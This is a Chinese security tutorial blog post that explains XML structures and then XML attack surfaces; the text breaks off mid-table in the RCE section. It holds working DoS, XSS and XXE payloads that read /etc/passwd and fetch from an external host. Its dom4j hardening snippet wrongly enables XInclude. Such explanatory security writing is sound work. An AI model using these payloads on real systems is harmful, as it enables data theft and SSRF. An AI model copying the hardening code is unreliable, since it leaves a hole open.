#  XML 相关漏洞风险研究   
 迪哥讲事   2024-06-03 20:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3eicVGzibzClBwcGgibVewXdv6ZodAdTntng7fEt55X7cFfxRxMWkNVwlpsSTL2RGBKcfMo4yyWPuwict52auTcRuw/640?wx_fmt=png&from=appmsg "null")  
# 前言  
  
经常看到有关 XXE 的漏洞分析，大概知道原理，但是对 XML 中相关的定义却一知半解。XEE 全称为 XML External Entity 即 XML 外部实体，但除了常见的 EXP 还有哪些触发方法？XML 相关的漏洞除了 XXE 还有什么其他攻击面？为了回答这些问题，本文先从开发者的角度先学习 XML 的基本结构和一些进阶用法，然后再引申出相关的攻击场景。  
# XML 101  
  
XML 是一个文档标准，用于描述结构化的文本文档，使其同时实现机器可读且人类也可读的目标。其全称为 Extensible Markup Language，即可拓展标记语言。一个简单的 XML 示例如下:  
```
<?xml version="1.0" encoding="UTF-8"?>
<foo>hello</foo>
```  
  
其中第一部分为可选的声明(Prolog 或者 Declaration)，描述文档使用的版本以及编码等信息；第二部分是一个标签(Tag)，为 XML 文档中的基本单位，可以嵌套使用但需要正确闭合。  
  
当然 XML 标准中还定义了许多核心概念，如属性(Attributes)、命名空间(Namespaces)、字符数据(CDATA)等，本节关注其中比较重要的几个概念，完整文档可以参考:  
- •   
Extensible Markup Language (XML) 1.0 (Fifth Edition)[1]  
  
- •   
XML - wikipedia[2]  
  
## DTD  
  
DTD 全称为 **Document Type Definition**，即文档类型定义，主要用于定义 XML 文档的结构，比如指定文档中允许存在哪些元素、元素的内容和属性、元素的嵌套规则等。  
  
我们先看一个 DTD 的经典用法:  
```
<?xml version="1.0"?>
<!DOCTYPE note [<!ELEMENT note (to,from)><!ELEMENT to (#PCDATA)><!ELEMENT from (#PCDATA)>]>
<note>
    <to>Alice</to>
    <from>Bob</from>
</note>
```  
  
上面定义了一个 XML 文档，根结点为 note，包含 to、from 这两个子元素(标签)，且这两个子标签都是文本标签，即其子元素为文本数据，使用 #PCDATA 表示(Parsed Character Data)。  
  
将文档类型定义写在 XML 文档中称为内部 DTD，除此之外，还可以写在单独的文件中进行引用，称为外部 DTD，比如写在下面的 note.dtd 中:  
```
<!ELEMENT note (to,from)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
```  
  
原始的 XML 可以改成:  
```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>Alice</to>
    <from>Bob</from>
</note>
```  
  
我们也可以在引入外部 dtd 的同时定义额外的内部 dtd 规则:  
```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd" [<!ELEMENT msg (#PCDATA)>]>
<note>
    <to>Alice</to>
    <from>Bob</from>
    <msg>hello</msg>
</note>
```  
  
在 XML 标准中对于 DTD 的格式定义如下(EBNF格式):  
```
doctypedecl ::= '<!DOCTYPE' S Name (S ExternalID)? S? ('[' intSubset ']' S?)? '>'

S ::=  (#x20 | #x9 | #xD | #xA)+
ExternalID ::=  'SYSTEM' S SystemLiteral
              | 'PUBLIC' S PubidLiteral S SystemLiteral
intSubset  ::= (markupdecl | DeclSep)*
```  
  
外部 DTD 除了可以用 SYSTEM 引入系统磁盘文件，还可以使用 PUBLIC 引入网络文件，比如:  
```
<?xml version="1.0"?>
<!DOCTYPE note PUBLIC "-//W3C//DTD XMLNote 1.0//EN" "http://evilpan.com/note.dtd">
<note>
    <to>Alice</to>
    <from>Bob</from>
</note>
```  
> 其中 PUBLIC 后的字符串 "-//W3C//... 为 Public Identifier，用于描述 DTD 的格式。比如针对 HTML 的示例:  
  
- •   
-//W3C//DTD HTML 4.01//EN[3]  
  
- •   
-//W3C//DTD HTML 4.01 Transitional//EN[4]  
  
- •   
-//W3C//DTD HTML 4.01 Frameset//EN[5]  
  
关于 DTD 的详细介绍可以参考下面的文档:  
- •   
Document_type_definition - Wikipedia[6]  
  
- •   
Prolog and Document Type Declaration[7]  
  
## Entity  
  
在 XML 中另外一个重要的概念就是实体(Entity)。对于编程人员来说，实体可以理解为变量。实体的引用**通常**以 & 开头且以 ; 结尾，除了参数实体以 % 开头。XML 文档中定义了五个标准实体，分别是:  
- • &amp; 表示与字符：& (ampersand)  
  
- • &apos; 表示单引号：' (apostrophe)  
  
- • &quot; 表示双引号：" (quotation mark)  
  
- • &lt; 表示小于号：< (less than)  
  
- • &gt; 表示大于号：> (greater than)  
  
实体根据类型主要分为字符实体、命名实体、外部实体和参数实体。  
  
字符实体可以用数字表示任意字符，比如字符 A 可以表示为 &#65;(十进制) 或者 &#x41;(十六进制)；  
  
命名实体在 XML 规范中也称为内部实体，命名实体在内部或者外部 DTD 中进行声明，在 XML 文档解析过程中，实体引用会被替换成其定义的值。XML 文档中对于实体定义的规范如下:  
```
[70]    EntityDecl  ::=    GEDecl | PEDecl
[71]    GEDecl      ::=    '<!ENTITY' S Name S EntityDef S? '>'
[72]    PEDecl      ::=    '<!ENTITY' S '%' S Name S PEDef S? '>'
[73]    EntityDef   ::=    EntityValue | (ExternalID NDataDecl?)
[74]    PEDef       ::=    EntityValue | ExternalID
```  
  
其中 71 定义内部/外部实体，72定义的是参数实体。  
  
一个示例的(内部)实体定义如下:  
```
<?xml version="1.0"?>
<!DOCTYPE note [<!ELEMENT note (to,from)><!ELEMENT to (#PCDATA)><!ELEMENT from (#PCDATA)><!ENTITY sb "evilpan">]>
<note>
    <to>&sb;</to>
    <from>&sb;</from>
</note>
```  
  
在 XML 解析时，实体会被替换成引用的值，即:  
```
<note>
    <to>evilpan</to>
    <from>evilpan</from>
</note>
```  
  
同时实体的定义中也可以嵌套引用其他实体，比如  
```
<!ENTITY c "Hello">
<!ENTITY ch "&c; World">
```  
> 注意: 循环引用会导致 XML 解析器报错。  
  
  
外部实体的定义与上一节中对 DTD 的 ExternalID 的定义是一致的:  
```
ExternalID ::=  'SYSTEM' S SystemLiteral
              | 'PUBLIC' S PubidLiteral S SystemLiteral
```  
  
外部实体的一个使用示例如下:  
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY header SYSTEM "header.xml">]>
<root>
&header;
<body>hello</body>
</root>
```  
  
由于外部实体可以引用文件系统中的文件，因此如果攻击者可控可能会导致信息泄露的风险，这也是 XXE 漏洞的根因，后文会详细介绍。  
  
上面介绍的这些实体统称为一般实体(General Entities)，与之相对应的是参数实体(Parameter Entities)。参数实体同样定义在 DTD 中，但名称前会加一个百分号 %，并且参数实体只能在 DTD 中使用 %name; 进行引用:  
```
<!ENTITY % YN '"Yes"' >
<!ENTITY WhatHeSaid "He said %YN;" >
```  
- •   
Character and Entity References[8]  
  
- •   
XML entity[9]  
  
- •   
在 XML 中添加实体[10] (  
备份[11])  
  
- •   
List of XML and HTML character entity references[12]  
  
## Namspace  
  
XML命名空间（XML Namespaces）是一种机制，用于避免XML文档中元素和属性名的冲突。当不同的文档或不同的组织使用相同的名称但定义不同的元素时，通过为元素和属性名提供一个命名空间，可以明确它们的身份和范围。  
  
XML命名空间通过在元素开始标签中使用xmlns属性来声明。xmlns属性可以定义一个默认命名空间或一个带前缀的命名空间：  
- • **默认命名空间**：xmlns="命名空间URI"，声明后，当前元素及其子元素（除非另有指定）都属于指定的命名空间。  
  
- • **前缀命名空间**：xmlns:前缀="命名空间URI"，仅适用于使用该前缀的元素和属性。  
  
命名空间的使用示例如下，定义了一个默认命名空间和一个前缀命名空间，其中 message 元素属于前缀命名空间 ex:  
```
<?xml version="1.0"?>
<note xmlns="http://www.evilpan.com/note"
      xmlns:ex="http://www.example.com/foo">
    <to>Alice</to>
    <from>Bob</from>
    <ex:message id="1337">Foo</ex:message>
</note>
```  
  
详见:  
- •   
XML namespaces[13]  
  
## XSD  
  
前面说过 XML 的文档格式定义和校验主要基于文档类型声明 DTD，但其存在许多局限性，比如:  
- • 对于一些新的 XML 特性没有明确支持，主要包括 XML namespace；  
  
- • 缺乏表现力，对于一些特殊的文档格式无法进行描述；  
  
- • 缺乏可读性，DTD 的编写大都把 Entity 当做宏来使用，导致难以阅读；  
  
- • ……  
  
为了解决这些问题，W3C 提出了一种新的文档声明格式 XML Schema Definition，即 XSD。与基于DTD（文档类型定义）的验证相比，XML Schema 提供了更丰富的数据类型支持、更强的约束定义能力以及命名空间的支持。  
  
还是以上文中的 note 为例，其 XML 文档内容使用 XML Schema 约束的示例如下:  
```
<?xml version="1.0"?>
<note xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="note.xsd">
    <to>Alice</to>
    <from>Bob</from>
</note>
```  
  
note.xsd 文件同样是一个合法的 XML 文件:  
```
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <!-- 定义根元素 note -->
  <xs:element name="note">
    <xs:complexType>
      <xs:sequence>
        <!-- note 元素包含 to 和 from 子元素 -->
        <xs:element name="to" type="xs:string"/>
        <xs:element name="from" type="xs:string"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```  
  
可以看到 XML Schema 可以对元素和属性做出更精确的定义，不过由于其语法相对繁琐也经常被开发者所诟病。关于 XSD 更多的数据结构和数据类型定义，可以参考下面的文档:  
- •   
XML Schema (W3C)[14]  
  
- •   
W3Cs XML Schema Primer[15]  
  
## XInclude  
  
XML Inclusions (XInclude) 也是 W3C 的一个建议标准，主要用于对 XML 文档进行结构化拆分和包含，一个典型的用法如下:  
```
<?xml version="1.0"?>
<note xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="xml" href="foo.xml"/>
</note>
```  
  
前文我们学习了 XSD，下面则是 XInclude 元素的 XSD 描述:  
- • https://www.w3.org/2001/XInclude/XInclude.xsd  
  
主要定义了 include 标签和 fallback 子标签，其中 fallback 的作用主要提供在 include 加载失败时的默认信息。  
  
include 标签中包含 href、parse 等属性。  
```
<xs:complexType name="includeType" mixed="true">
    <xs:choice minOccurs="0" maxOccurs="unbounded">
        <xs:element ref="xi:fallback"/>
        <xs:any namespace="##other" processContents="lax"/>
        <xs:any namespace="##local" processContents="lax"/>
    </xs:choice>
    <xs:attribute name="href" use="optional" type="xs:anyURI"/>
    <xs:attribute name="parse" use="optional" default="xml" type="xi:parseType"/>
    <xs:attribute name="xpointer" use="optional" type="xs:string"/>
    <xs:attribute name="encoding" use="optional" type="xs:string"/>
    <xs:attribute name="accept" use="optional" type="xs:string"/>
    <xs:attribute name="accept-language" use="optional" type="xs:string"/>
    <xs:anyAttribute namespace="##other" processContents="lax"/>
</xs:complexType>
```  
  
其中，  
- • href: 指定包含的文件 URI，可以是本地文件路径，也可以是网络地址；  
  
- • parse: 表示所包含文件的格式，为 xml 或者 text，默认为 xml；  
  
- • xpointer: 表示当 parse 为 xml 时，用于指定包含目标 XML 的范围，即选择包含部分的 XML 内容，其语法见   
XPointer Framework[16]；  
  
- • encoding: 指定包含文件的编码，仅对 parse="text" 有效；  
  
- • accept: 当 href 为网络地址时，用于指定 Accept 头的内容；  
  
- • accept-language: 当 href 为网络地址时，用于指定 Accept-Language 头的内容；  
  
这里有人可能会有疑问，XInclude 与外部实体不是类似的吗？确实，它们的作用都是用来包含外部文档片段以减少复制粘贴。但他们有个核心的差异，Entity 的解析是在 XML 文件解析的过程中执行的，而 XInclude 则是在 XML 文档解析之后处理的，操作于信息集上，二者并没有直接联系。  
  
也就是说，**即便 XML 解析器禁用了外部实体，依然可能可以通过 XInclude 包含文档**。  
- •   
XInclude - wikipedia[17]  
  
- •   
Using XInclude[18]  
  
- •   
XInclude Standard[19]  
  
## XSLT  
  
XSLT 全称为 Extensible Stylesheet Language Transformations，主要用于编写样式表将 XML 转换为其他格式的文档，如 XHTML、JSON、文本等。XSLT 也是基于 XML 的，但具备强大的灵活性和扩展性。不仅可以用于文档转换，还常被用于数据清洗、报告生成以及数据的提取和重组等任务。  
  
XSLT 单独保存为文件时可以是 .xsl 或者 .xslt 后缀。以我们之前的 note XML 为例，以下 note.xsl 将其转换为 XHTML 文档:  
```
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
    <body>
      <h1>Note</h1>
      <p>To: <xsl:value-of select="note/to"/></p>
      <p>From: <xsl:value-of select="note/from"/></p>
    </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```  
  
简单来说，XSLT 之于 XML，类似 CSS 之于 HTML。我们可以在 XML 文档中使用 XML 声明(xml-stylesheet)引用该 XSLT，如下所示:  
```
<?xml version="1.0" encoding="UTF-8"?>  
<?xml-stylesheet href="note.xsl" type="text/xsl"?>
<note>
    <to>Alice</to>
    <from>Bob</from>
</note>
```  
  
如果你曾经在浏览器中打开过 XML 文件，那很可能遇到过这个提示，表示当前 XML 没有指定 XSLT 样式表:  
> This XML file does not appear to have any style information associated with it.  
  
  
值得一提的是，虽然 XSLT 通常被当成样式表来使用，但其实它可以看成是一个图灵完备的编程语言，比如支持条件判断:  
```
<xsl:if test="expression">
    <!-- 条件为真时的操作 -->
</xsl:if>
```  
  
if-else:  
```
<xsl:choose>
    <xsl:when test="expression">
        <!-- 第一个条件为真时的操作 -->
    </xsl:when>
    <xsl:otherwise>
        <!-- 上述条件都不满足时的操作 -->
    </xsl:otherwise>
</xsl:choose>
```  
  
循环:  
```
<xsl:for-each select="path/to/element">
    <!-- 对每个选中的元素执行的操作 -->
</xsl:for-each>
```  
  
此外 XSLT 支持函数调用，比如:  
```
<xsl:value-of select="current()"/>
<xsl:value-of select="concat('foo', 'bar')"/>
<xsl:value-of select="document('foo.xml')"/>
```  
  
在 XSLT 2.0 标准中还支持自定义函数 xsl:function，极大丰富了 XSLT 的功能。  
- •   
XSLT - Wikipedia[20]  
  
- •   
XSL Transformations (XSLT) Version 1.0[21]  
  
- •   
XSL Transformations (XSLT) Version 2.0 (Second Edition)[22]  
  
- •   
XSL Transformations (XSLT) Version 3.0[23]  
  
- •   
XInclude with XSLT[24]  
  
- •   
Java API for XML Processing (JAXP) Tutorial - XSLT[25]  
  
# 漏洞风险  
  
上面我们介绍了 XML 中涉及到的一些基本概念，本节就来从攻击者角度看看其中能引申出什么风险。  
## DoS  
  
在 Entity 一节中我们说到 XML 的 DTD 可以定义实体，而且实体的定义中可以引入其他实体，那么我们可以定义一个 XML 不断引用其他实体，可以以很小的初始数据实现指数级别的内容膨胀，一个示例如下:  
```
<?xml version="1.0"?>
<!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>
<lolz>&lol9;</lolz>
```  
  
上述 XML 文件在解析 <lolz> 根节点时不断解析前述定义的实体，最终可以让根节点包含 10^9 个 "lol" 字符串，占用大约 3 GB 内存，从而实现对目标解释器拒绝服务的效果。由于最初使用的是 lol 作为 payload，因此这种攻击也称为 Billion laughs attack。要缓解这类攻击通常需要在 XML 解析器中配置禁用 DOCTYPE。  
- •   
Billion laughs attack[26]  
  
## XSS  
  
在 XSLT 一节中我们说到基于 XSLT 样式表可以为 XML 提供样式转换，而且这个转换是浏览器也支持的。既然可以将 XML 转换成 HTML 来渲染，那么是否支持 HTML 中的一些特性呢，比如执行 JavaScript 脚本？答案是肯定的。  
  
我们稍微修改一下前文中的样式表，如下所示:  
```
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
    <head>
      <script> alert(/xss/) </script>
    </head>
    <body>
      <h1>Note</h1>
      <p>To: <xsl:value-of select="note/to"/></p>
      <p>From: <xsl:value-of select="note/from"/></p>
    </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```  
  
然后在浏览器中打开 note.xml，发现 JavaScript 正确执行了！  
  
经过一番搜索后发现，除了间接引用 XSLT，在 XML 文档本身中，也可以通过命名空间指定 XHTML 来执行 JavaScript 代码，示例 xss.xml 如下:  
```
<?xml version="1.0" encoding="UTF-8"?>  
<note>
  <to>Alice</to>
  <from>Bob</from>
  <xh:script xmlns:xh="http://www.w3.org/1999/xhtml">alert(/xss/)</xh:script>
</note>
```  
  
因为如果在 XML 中使用 <script> 标签会被认为是一个普通元素而不会将其子元素当成 JavaScript 执行。  
## XXE  
  
终于说到了我们开头提到的 XXE 漏洞，这是 XML 相关风险中一个相当重要的攻击场景，并且引申出了很多其他的攻击风险。  
  
回到漏洞本身，其实 root cause 很简单，核心在于外部实体定义可以指定引用系统文件，从而导致解析 XML 的过程中引起信息泄露，一个常见的 PoC 如下:  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [    <!ENTITY xxe SYSTEM "/etc/hosts">]>
<root>
  <foo>&xxe;</foo>
</root>
```  
  
Entity 实体定义除了引用系统文件，还能引用网络文件:  
```
<!ENTITY xxe SYSTEM "http://example.com/xxe">
<!ENTITY xxe SYSTEM "ftp://example.com/xxe">
```  
  
这一方面可以将 XXE 转换为 SSRF 漏洞，另一方面也可以将某些敏感信息通过网络请求回传给攻击者。  
  
除了 SYSTEM Entity，PUBLIC Entity 同样可是实现类似的效果:  
```
<!ENTITY xxe PUBLIC "-//W3C//EVILPAN/EN" "/etc/hosts">
<!ENTITY xxe PUBLIC "-//W3C//EVILPAN/EN" "file:///etc/hosts">
<!ENTITY xxe PUBLIC "-//W3C//EVILPAN/EN" "http://evilpan.com/xxe">
```  
  
得益于我们前面系统学习了 XML 的定义，因此知道除了普通实体以外，参数实体也可以用来进行 XXE 攻击:  
```
<!ENTITY % xxe SYSTEM "http://evilpan.com/xxe">
<!ENTITY % xxe SYSTEM "ftp://evilpan.com/xxe">
```  
  
那么是不是只要禁用了 **外部实体** 就能解决该问题了呢？我们前面说过 XInclude 是不使用外部实体的一个建议标准，如果 XML 解析器没有禁用 XInclude 的话也可能会造成 XXE 攻击，比如   
ImageMagick 的 CVE-2023-38633[27] 漏洞。  
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hosts"/>
</foo>
```  
  
那么，我们把 XInclude 也禁用就好了吧！但如果你只禁用了外部实体的话，别忘记 DTD 本身也是可以使用 “外部” 引用的:  
```
<!DOCTYPE root SYSTEM "http://evilpan.com/xxe.dtd">
```  
  
这也是一个潜在的 SSRF 漏洞，因此我们需要将 DOCTYPE 完全禁用才能完全缓释这个问题。  
  
例如在一个基于 Java dom4j 的项目中，我们可能需要设置禁用一大堆 Feature 才敢放心地处理一个外部传入的 XML 文件:  
```
String EGE = "http://xml.org/sax/features/external-general-entities";
String EPE = "http://xml.org/sax/features/external-parameter-entities";
String LED = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
String DDD = "http://apache.org/xml/features/disallow-doctype-decl";
String XIN = "http://apache.org/xml/features/xinclude";
SAXReader reader = new SAXReader();  
reader.setFeature(LED, false);  
reader.setFeature(EGE, false);  
reader.setFeature(EPE, false);  
reader.setFeature(DDD, true);  
reader.setFeature(XIN, true);  
Document dom = reader.read(file);
```  
  
除了上面 XML 自带的特性，还有我们前面提到的 XML Schema 可以指定外部 xsd 文件，XSLT 可以指定 xsl 样式转换文件，这都带来了潜在的 SSRF 风险。对于 XSLT 而言，我们可以基于其内置的标签或者函数去引入外部文件:  
```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="file:///etc/passwd"/>
  <xsl:import href="file:///etc/passwd"/>
</xsl:stylesheet>
```  
  
基于 document 内置方法:  
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet  version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```  
  
该 PoC 正是最近   
获得 $28000 赏金的 Safari CVE-2023-40415 和 Chrome CVE-2023-4357[28] 所使用的。即使在浏览器这么安全的软件中也依然忽视了这些 XML 的攻击面，另外提一嘴，Chrome 中使用的还只是 XSLT 1.0 的标准，我们前面看到 XSLT 已经出到了 3.0，其中增加了许多内置函数，有心人如果捡到了新的漏洞别忘了也给我分享一下 :)  
  
最后回到 XXE 的漏洞利用上。如果目标 XML 解析器能够回显某个请求的 XML 结点那一切都好办，我们可以通过回显拿到泄露的文件内容。  
  
如不不幸没有回显，还可以尝试通过 SSRF 外带出文件内容，不过由于没有 URL 编码，在遇到特殊字符如换行符的时候通常会被截断。  
  
对于 Java 应用可以尝试用 FTP 去传输带有换行的文件，不过 Java 高版本中也不再支持了。  
  
这时如果服务端解析 XML 的报错信息能出现在返回内容中，就可以使用基于报错的回显。不过报错回显也不是什么错都能报的，要想在比较通用的报错信息中获得回显，一般需要一个可控的 DTD 文件，这就要求需要网络连接。2018 年十佳安全技术之一   
Exploiting XXE with local DTD files[29] 就提出了使用本机上内置的一些 DTD 文件来实现报错，感兴趣的可以阅读原文细看。  
- •   
When URL parsers disagree (CVE-2023-38633)[30]  
  
- •   
Getting XXE in Web Browsers using ChatGPT[31]  
  
- •   
Chromium#4822244 [M114-LTS] Set current document when processing xsl document()[32]  
  
- •   
REDTEAM TALES 0X1: SOAPY XXE[33]  
  
- •   
Exploiting XXE with local DTD files[34]  
  
- •   
以 Apache Solr CVE-2017-12629 为例介绍三种 Error Based XXE 在实战中利用的方法 - phith0n[35]  
  
## RCE  
  
XXE 似乎是 XML 能见到的最严重的漏洞了，但其实在某些场景中 XML 也能直接造成 RCE 的风险，其中最主要的一个场景还是 XSLT。不同的 XSLT 编译器(解释器?)有不同的实现，因此我们在测试 XSLT 之前第一件事就是先确定其实现以及支持的版本，XSLT 1.0 标准中定义了 3 个必须实现的属性，使用 system-property 函数进行获取:  
```
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
```  
  
其中比较重要的是 Vendor 信息，  
@IOActive[36] 统计了一些常见的 XSLT 引擎信息如下表所示:  
  
<table><thead style="line-height: 1.75;background: rgba(0, 0, 0, 0.05);font-weight: bold;color: rgb(63, 63, 63);"><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">processor</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">xsl:version</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">xsl:vendor</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">JavaScript</td></tr></thead><tbody><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><strong style="line-height: 1.75;color: rgb(210, 7, 125);">server</strong></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">xalan-c</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Apache Software Foundation</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">xalan-j</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Apache Software Foundation</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">saxon</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">2</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Saxonica</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">xsltproc</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">php</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">python</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">perl</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">ruby</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">no</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><strong style="line-height: 1.75;color: rgb(210, 7, 125);">client</strong></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);"><br/></td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">safari</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">yes</td></tr><tr><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">opera</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">1</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;color: rgb(63, 63, 63);">libxslt</td><td style="line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 